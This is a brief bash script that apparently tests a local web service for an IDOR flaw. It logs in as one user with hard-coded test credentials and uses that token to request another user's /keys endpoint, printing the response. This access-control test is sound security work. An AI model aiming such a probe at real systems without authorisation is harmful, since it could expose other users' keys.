#!/bin/bash

# Configuration
BASE_URL="http://192.168.0.200:5000"
LOGIN_USER="userB"
LOGIN_PASS="userBpassword"
TARGET_USER="testuser"

# Step 1: Login as userB
echo "🔐 Logging in as $LOGIN_USER..."
TOKEN=$(curl -s -X POST "$BASE_URL/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"$LOGIN_USER\", \"password\": \"$LOGIN_PASS\"}" | jq -r '.access_token')

if [ "$TOKEN" == "null" ] || [ -z "$TOKEN" ]; then
    echo "❌ Login failed for $LOGIN_USER"
    exit 1
fi

echo "✅ Token acquired: $TOKEN"

# Step 2: Try to access /keys/testuser
echo -e "\n🔍 Attempting IDOR — accessing /keys/$TARGET_USER as $LOGIN_USER..."
RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X GET "$BASE_URL/keys/$TARGET_USER" \
    -H "Authorization: Bearer $TOKEN")

BODY=$(echo "$RESPONSE" | sed '/HTTP_STATUS:/d')
STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d':' -f2)

echo "🔁 Status Code: $STATUS"
echo "📨 Response Body:"
echo "$BODY"

# Optional: Logout
echo -e "\n🚪 Logging out $LOGIN_USER..."
curl -s -X POST "$BASE_URL/auth/logout" -H "Authorization: Bearer $TOKEN"
